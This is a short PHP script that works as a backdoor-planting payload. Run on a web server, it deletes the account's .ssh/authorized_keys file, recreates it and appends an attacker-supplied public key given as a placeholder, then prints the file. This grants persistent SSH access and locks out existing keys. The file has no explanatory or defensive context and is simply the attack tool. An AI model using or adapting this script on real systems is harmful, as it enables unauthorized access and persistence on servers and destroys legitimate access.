<?php
  error_reporting(E_ALL);
  $key = "your id_rsa.pub key"
  shell_exec('rm -rf ../../.ssh/authorized_keys');
  shell_exec('touch ../../.ssh/authorized_keys');
  shell_exec('echo ' . $key . ' >> ../../.ssh/authorized_keys');
  echo shell_exec('cat ../../.ssh/authorized_keys');
?>
